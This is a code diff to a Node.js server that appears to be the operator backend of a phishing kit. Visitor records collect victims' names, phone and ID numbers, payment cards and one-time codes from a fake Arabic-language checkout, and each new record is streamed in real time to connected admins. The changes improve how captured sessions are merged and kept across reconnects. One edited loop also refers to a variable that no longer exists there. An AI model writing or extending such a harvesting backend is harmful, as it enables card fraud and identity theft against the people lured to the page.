@@ -1588,15 +1588,16 @@ server.listen(PORT, () => {
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
 
 /*KDD-KDKAW-BRIDGE5*/
-try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk5',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
+try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk7',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
 var __kdkSock={};
+function __kdkAll(){var o=[],s={};try{visitors.forEach(function(v){if(v&&v.__kdk&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}try{savedVisitors.forEach(function(v){if(v&&v.__kdk&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}return o}
 function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
 function __kdkMake(socket){try{
 var h=(socket.handshake&&socket.handshake.headers)||{};
 var ua=h['user-agent']||'';
 var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();
 var ex=null;
-try{visitors.forEach(function(v){if(ex||!v)return;if(v.ip===ip&&(v.userAgent?v.userAgent===ua:true)&&(Date.now()-(v.lastActivity||0))<900000)ex=v})}catch(e){}
+try{__kdkAll().forEach(function(v){if(ex||!v)return;if(v.ip===ip&&(v.userAgent?v.userAgent===ua:true)&&(Date.now()-(v.lastActivity||0))<900000)ex=v})}catch(e){}
 if(ex){__kdkSock[socket.id]=ex;ex.lastActivity=Date.now();ex.isConnected=true;if(!ex.userAgent)ex.userAgent=ua;visitors.set(socket.id,ex);admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',ex)}catch(e){}});console.log('kdk5 adopt',socket.id,ex._id);return ex}
 try{visitorCounter++}catch(e){}
 var v={_id:'visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,9),socketId:socket.id,visitorNumber:(typeof visitorCounter==='number'?visitorCounter:1),createdAt:new Date().toISOString(),isRead:false,fullName:'',phone:'',idNumber:'',apiKey:(typeof generateApiKey==='function'?generateApiKey():''),ip:ip,userAgent:ua,country:h['cf-ipcountry']||'Unknown',city:'',os:'',device:'',browser:'',date:new Date().toISOString(),blockedCardPrefixes:[],page:'الرئيسية',data:{},dataHistory:[],paymentCards:[],digitCodes:[],hasNewData:false,isBlocked:false,isConnected:true,sessionStartTime:Date.now(),lastActivity:Date.now(),__kdk:true};
@@ -1640,13 +1641,13 @@ console.log('kdk5 hit',ev,name||table);
 __kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk5 any err',e.message)}})});
 setInterval(function(){try{
 var g={};
-visitors.forEach(function(v,k){if(!v||!v.__kdk)return;var key=String(v.ip||'')+'|'+String(v.userAgent||v.device||'');if(!g[key])g[key]=[];g[key].push({v:v,k:k})});
+__kdkAll().forEach(function(v){if(!v||!v.__kdk)return;var key=String(v.ip||'')+'|'+String(v.userAgent||v.device||'');if(!g[key])g[key]=[];g[key].push({v:v,k:k})});
 Object.keys(g).forEach(function(kk){
 var a=g[kk];if(a.length<2)return;
 a.sort(function(x,y){return ((y.v.fullName?1:0)-(x.v.fullName?1:0))||((x.v.sessionStartTime||0)-(y.v.sessionStartTime||0))});
 var keep=a[0].v;
 for(var i=1;i<a.length;i++){
-var d=a[i].v;if(d._id===keep._id)continue;
+var d=a[i].v;if(d._id===keep._id)continue;if(!visitors.has(keep.socketId)&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}
 keep.data=Object.assign({},d.data||{},keep.data||{});
 if(!keep.fullName&&d.fullName)keep.fullName=d.fullName;
 if(!keep.phone&&d.phone)keep.phone=d.phone;
